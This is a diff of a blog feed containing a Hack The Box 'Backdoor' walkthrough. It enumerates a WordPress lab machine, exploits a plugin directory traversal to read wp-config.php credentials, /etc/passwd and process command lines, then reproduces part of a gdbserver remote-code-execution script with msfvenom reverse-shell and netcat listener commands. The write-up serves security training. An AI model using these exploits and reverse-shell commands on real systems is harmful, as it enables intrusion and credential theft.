@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-30T20:24:43+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - Backdoor</title><link href="http://localhost:4000/htb-backdoor/" rel="alternate" type="text/html" title="HTB - Backdoor" /><published>2021-11-30T00:00:00+01:00</published><updated>2021-11-30T00:00:00+01:00</updated><id>http://localhost:4000/htb-backdoor</id><content type="html" xml:base="http://localhost:4000/htb-backdoor/">&lt;p&gt;Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-01T04:36:20+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - Backdoor</title><link href="http://localhost:4000/htb-backdoor/" rel="alternate" type="text/html" title="HTB - Backdoor" /><published>2021-11-30T00:00:00+01:00</published><updated>2021-11-30T00:00:00+01:00</updated><id>http://localhost:4000/htb-backdoor</id><content type="html" xml:base="http://localhost:4000/htb-backdoor/">&lt;p&gt;Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/portada.png&quot; /&gt;
@@ -162,6 +162,436 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/captura13.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now with nmap we are going to do a simple fuzzing to see potential routes.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue Nov 23 20:18:33 2021 as: nmap --script http-enum -p80 -oN WebScan 10.129.109.254
+Nmap scan report for backdoor.htb (10.129.109.254)
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2
+|   /: WordPress version: 5.8.1
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+
+# Nmap done at Tue Nov 23 20:18:47 2021 -- 1 IP address (1 host up) scanned in 13.31 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see a login page but we don’t have credentials at the moment.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura14.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;if we go to the blog section of the web page we see that there is a post published by the admin user so I deduce that in this web there is only one user who is the admin.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura15.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;With searchspliot tool I tried to search if there is any vulnerability in the version of wordpress that came with this machine, but I did not find anything interesting.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura16.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now what I did is apply fuzzing with &lt;strong&gt;&lt;em&gt;wfuzz&lt;/em&gt;&lt;/strong&gt; to find potential routes. I know I did fuzzing with nmap but nmap is not as powerful as wfuzz and wfuzz gives us more information.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura17.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Another alternative to the wfuzz tool is &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; which is made in go language and as you know go works well with sockets and connections.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura18.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Using wfuzz and gobuster are almost the same routes that i found with nmap only the only interesting route i found is wp-content as it may contain plugins that are installed on this page, and we can find possible vulnerabilities but we will see that below.&lt;/p&gt;
+
+&lt;p&gt;What I am going to do is with the tool &lt;strong&gt;&lt;em&gt;WPscan&lt;/em&gt;&lt;/strong&gt; we are going to scan this wordpress page to see if there are more plugins or themes that have installed and the possible vulnerabilities they have.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura19.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;This is a wpscan look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[32m[+][0m URL: http://10.10.11.125/ [10.10.11.125]
+[32m[+][0m Started: Sun Nov 28 03:51:52 2021
+
+Interesting Finding(s):
+
+[32m[+][0m Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[32m[+][0m XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[32m[+][0m WordPress readme found: http://10.10.11.125/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[32m[+][0m WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.11.125/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.8.1&amp;lt;/generator&amp;gt;
+ |  - http://10.10.11.125/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.8.1&amp;lt;/generator&amp;gt;
+
+[32m[+][0m WordPress theme in use: twentyseventeen
+ | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
+ | Latest Version: 2.8 (up to date)
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
+ | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ | License: GNU General Public License v2 or later
+ | License URI: http://www.gnu.org/licenses/gpl-2.0.html
+ | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready, block-patterns
+ | Text Domain: twentyseventeen
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.8 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'
+
+
+[34m[i][0m No plugins Found.
+
+[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
+[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[32m[+][0m Finished: Sun Nov 28 03:51:56 2021
+[32m[+][0m Requests Done: 2
+[32m[+][0m Cached Requests: 34
+[32m[+][0m Data Sent: 606 B
+[32m[+][0m Data Received: 1.027 KB
+[32m[+][0m Memory used: 239.539 MB
+[32m[+][0m Elapsed time: 00:00:04
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;With the wpscan scan I did not find relevant information about the plugins that this page has. I could have done a more aggressive scan using the command &lt;strong&gt;&lt;em&gt;wpscan –url http: //backdoor.htb –plugins-detection aggressive&lt;/em&gt;&lt;/strong&gt; but the scan would take a long time.&lt;/p&gt;
+
+&lt;p&gt;So what I did is to go in the path &lt;strong&gt;&lt;em&gt;wp-content/plugins&lt;/em&gt;&lt;/strong&gt; and I found a plugin that is installed.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura20.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation-phase&quot;&gt;Exploitation phase&lt;/h2&gt;
+
+&lt;p&gt;When I opened the folder of this plugin I found the file “readme.txt” and that is where I could see the version of this plugin.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura21.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Then with searchsploit we search if that have any exploit, and I found one specifically about the version that have installed in the wordpress and it is also a very critical one that is “Directory traversal”.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura22.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Open the exploit and we can see that there is a specific path that is vulnerable to directory traversal.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura23.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;When I go to the path I installed the wordpress configuration file which is &lt;strong&gt;&lt;em&gt;wp-config.php&lt;/em&gt;&lt;/strong&gt; and we can see that we have a username and password for the database and more information about the server.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura24.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;What I did is to try in the login page with admin user to see if the password that was in the configuration file was valid also to access with the admin account and the password didt’nt work.&lt;/p&gt;
+
+&lt;p&gt;So what I did is to save the database credentials in a file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura25.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Then what I did is try using the traversal dirictory to see if it would let me view the file &lt;strong&gt;&lt;em&gt;/etc/passwd&lt;/em&gt;&lt;/strong&gt; to see the users that exist on the victim machine. and we see that it works and there is a user named &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura26.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Then I tried to test if it would let me view the content of the directory “/user/home/.ssh/id_rsa” to see if it has the id_rsa key and so I could access via ssh on port 22, but it would not let me view anything.&lt;/p&gt;
+
+&lt;p&gt;Then I remembered that port 1337 was open but at the time of the port scan I could not see which service was running, so to find out which service is running on port 1337 we can use lfi.&lt;/p&gt;
+
+&lt;p&gt;using burpsuite we are going to use it as a proxy to intercept the request and sent it in the &lt;strong&gt;&lt;em&gt;intruder&lt;/em&gt;&lt;/strong&gt; to manipulate it and send it to the server. and here what we are going to do is use lfi through the path &lt;strong&gt;&lt;em&gt;/proc&lt;/em&gt;&lt;/strong&gt;, basically this path contains information about the processes that are running on the system. and we are going to use the path &lt;strong&gt;&lt;em&gt;/proc / pid / cmdline&lt;/em&gt;&lt;/strong&gt; that contains commands to start processes. here the &lt;strong&gt;&lt;em&gt;pid&lt;/em&gt;&lt;/strong&gt; will be a variable number&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura27.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And in the payload section we will specify that the type of payload will be &lt;strong&gt;&lt;em&gt;numeric **&lt;/em&gt;. and in **&lt;em&gt;payload option&lt;/em&gt;&lt;/strong&gt; I will specify that it generates the number of payloads in the range 900-1000.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura28.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;This process we can do it to with wfuzz with the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We click &lt;strong&gt;&lt;em&gt;attack&lt;/em&gt;&lt;/strong&gt; to start the process. and in the response part we can see the processes that it is executing in the command part in the system.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura29.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And boom!!! i found it in the port 1337 its running gdbserver that is a linux debugger.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura30.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn’t find anything.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura31.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Then searching in google i found an gdbserver exploit that allows me to RCE witch is a python script.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor/captura32.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So this is the script:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
+# Date: 2021-11-21
+# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
+# Vendor Homepage: https://www.gnu.org/software/gdb/
+# Software Link: https://www.gnu.org/software/gdb/download/
+# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
+Usage: python3 {sys.argv[0]} &amp;lt;gdbserver-ip:port&amp;gt; &amp;lt;path-to-shellcode&amp;gt;
+
+Example:
+- Victim's gdbserver   -&amp;gt;  10.10.10.200:1337
+- Attacker's listener  -&amp;gt;  10.10.10.100:4444
+
+1. Generate shellcode with msfvenom:
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+
+2. Listen with Netcat:
+$ nc -nlvp 4444
+
+3. Run the exploit:
+$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
+'''&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checksum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{res:2x}'&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'${s}#{checksum(s)}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'qSupported:multiprocess+;qRelocInsn+;qvCont+;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'vCont;s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[!] ERROR: Unexpected response. Try again later'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Found x64 arch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
